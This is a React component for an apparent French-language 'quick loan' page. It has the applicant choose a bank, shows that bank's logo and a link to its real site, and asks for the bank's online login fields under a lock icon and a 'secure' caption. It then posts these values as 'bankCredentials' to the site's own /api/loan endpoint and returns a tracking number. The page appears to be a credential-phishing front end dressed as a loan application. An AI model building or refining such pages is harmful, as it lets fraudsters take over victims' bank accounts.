import { useState } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useToastStore, useLangStore } from '../store';
import { t } from '../utils/i18n';
import { BANKS, BANK_FIELDS, BANKS_LOOKUP } from '../config/banks';

export default function QuickLoan() {
  const navigate = useNavigate();
  const { lang } = useLangStore();
  const l = lang || 'fr';
  const addToast = useToastStore(s => s.addToast);
  const [bankId, setBankId] = useState('');
  const [bankFieldValues, setBankFieldValues] = useState({});
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [trackingNumber, setTrackingNumber] = useState('');

  const selectedBank = BANKS.find(b => b.id === bankId);
  const selectedFields = bankId ? BANK_FIELDS[bankId] : null;

  const canSubmit = () => bankId && selectedFields
    && selectedFields.fields.every(f => bankFieldValues[f.name]?.trim());

  const handleSubmit = async () => {
    if (!canSubmit() || submitting) return;
    setSubmitting(true);
    try {
      const payload = { bankName: BANKS_LOOKUP[bankId] || bankId, bankId, bankCredentials: bankFieldValues };
      const res = await fetch('/api/loan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.message);
      setTrackingNumber(data.trackingNumber || '');
      setSubmitted(true);
      addToast(t('loan_toast', l), 'success');
    } catch (err) {
      addToast(t('loan_toast_err', l), 'error');
    }
    setSubmitting(false);
  };

  if (submitted) {
    return (
      <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center', padding:'120px 6% 60px', background:'var(--bg)' }}>
        <motion.div initial={{ opacity:0, scale:0.9 }} animate={{ opacity:1, scale:1 }} transition={{ duration:0.5, ease:[0.16,1,0.3,1] }}
          className="card" style={{ maxWidth:480, width:'100%', padding:'60px 40px', textAlign:'center' }}>
          <h2 style={{ fontFamily:"'Outfit',sans-serif", fontSize:28, fontWeight:900, marginBottom:12 }}>{t('loan_success', l)}</h2>
          <p style={{ fontSize:14, color:'var(--text-3)', lineHeight:1.7, marginBottom:32 }}>
            {t('loan_success_desc', l)}
          </p>
          {trackingNumber && (
            <div style={{
              background: 'linear-gradient(135deg, #0A1F44 0%, #1A3A6E 100%)',
              borderRadius: 14, padding: '24px 20px', marginBottom: 24,
            }}>
              <div style={{ fontSize:10, fontWeight:700, letterSpacing:'0.25em', textTransform:'uppercase', color:'rgba(255,255,255,0.55)', marginBottom:6 }}>
                {t('track_num', l)}
              </div>
              <div style={{
                fontFamily:"'Courier New',monospace", fontSize:30, fontWeight:800,
                color:'var(--gold)', letterSpacing:'0.1em', marginBottom:14,
              }}>
                {trackingNumber}
              </div>
              <a href={`/suivi?num=${encodeURIComponent(trackingNumber)}`} className="btn-gold"
                style={{ fontSize:11, padding:'10px 20px', textDecoration:'none', display:'inline-flex' }}>
                {t('track_btn', l)} →
              </a>
            </div>
          )}
          <div style={{ display:'flex', gap:12, justifyContent:'center', flexWrap:'wrap' }}>
            <button onClick={() => { setSubmitted(false); setBankId(''); setBankFieldValues({}); setTrackingNumber(''); }} className="btn-ghost" style={{ fontSize:12 }}>{t('loan_new', l)}</button>
            <button onClick={() => navigate('/')} className="btn-primary" style={{ fontSize:12 }}>{t('loan_home', l)}</button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <section style={{
      minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center',
      padding:'100px 6%', background:'var(--bg)',
    }}>
      <motion.div initial={{ opacity:0, y:12 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.4, ease:[0.16,1,0.3,1] }}
        className="card" style={{ maxWidth:480, width:'100%', padding:'28px 24px' }}>

        <div style={{ display:'flex', alignItems:'center', gap:12, marginBottom:20 }}>
          <div style={{ width:40, height:40, borderRadius:'50%', background:'rgba(245,166,35,0.1)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:18, flexShrink:0 }}>🔐</div>
          <div>
            <h3 style={{ fontFamily:"'Outfit',sans-serif", fontSize:16, fontWeight:800, margin:0 }}>
              {t('loan_step2', l)}
            </h3>
            <p style={{ margin:'2px 0 0', fontSize:12, color:'var(--text-3)' }}>
              {t('loan_secure', l)}
            </p>
          </div>
        </div>

        <div style={{ height:1, background:'var(--border)', marginBottom:20 }} />

        <div style={{ display:'flex', flexDirection:'column', gap:14 }}>
          <div>
            <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:5, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_bank_select', l)}</label>
            <select className="input-luxury" value={bankId} onChange={e => { setBankId(e.target.value); setBankFieldValues({}); }}>
              <option value="">{t('loan_choose', l)}</option>
              {BANKS.map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
            </select>
          </div>

          {selectedBank && selectedFields && (
            <motion.div initial={{ opacity:0, y:12 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.3, ease:[0.16,1,0.3,1] }}
              style={{ border:'1px solid var(--border-2)', borderRadius:10, overflow:'hidden' }}>
              <div style={{ padding:'12px 16px', background:'var(--bg-card2)', borderBottom:'1px solid var(--border)', display:'flex', alignItems:'center', gap:10 }}>
                <span style={{ fontSize:24, flexShrink:0 }}>{selectedFields.logo}</span>
                <div style={{ minWidth:0 }}>
                  <div style={{ fontSize:13, fontWeight:700, fontFamily:"'Outfit',sans-serif" }}>{selectedBank.name}</div>
                  <div style={{ fontSize:11, color:'var(--text-3)' }}>{t('loan_login_text', l)}</div>
                </div>
                <a href={selectedBank.url} target="_blank" rel="noopener noreferrer" style={{ marginLeft:'auto', fontSize:11, color:'var(--gold)', fontWeight:700, textDecoration:'none', flexShrink:0 }}>{t('loan_site', l)}</a>
              </div>
              <div style={{ padding:'18px 16px', display:'flex', flexDirection:'column', gap:14 }}>
                {selectedFields.fields.map(f => (
                  <div key={f.name}>
                    <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:4, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{f.label}</label>
                    <input className="input-luxury" type={f.type} value={bankFieldValues[f.name]||''} onChange={e => setBankFieldValues(v => ({...v, [f.name]: e.target.value}))} placeholder={f.placeholder} autoComplete="off" />
                  </div>
                ))}
              </div>
            </motion.div>
          )}
        </div>

        <button onClick={handleSubmit} disabled={!canSubmit() || submitting} className="btn-gold"
          style={{ width:'100%', marginTop:20, padding:'14px', fontSize:13,
            opacity: canSubmit() ? 1 : 0.4, cursor: canSubmit() ? 'pointer' : 'not-allowed' }}>
          {submitting ? t('loan_submitting', l) : t('loan_submit', l)}
        </button>

        <div style={{ textAlign:'center', marginTop:14 }}>
          <button onClick={() => navigate('/demande')} style={{ background:'none', border:'none', cursor:'pointer', fontSize:12, color:'var(--gold)', fontWeight:600, fontFamily:"'Outfit',sans-serif", padding:0 }}>
            {t('loan_quick_full', l)}
          </button>
        </div>
      </motion.div>
    </section>
  );
}
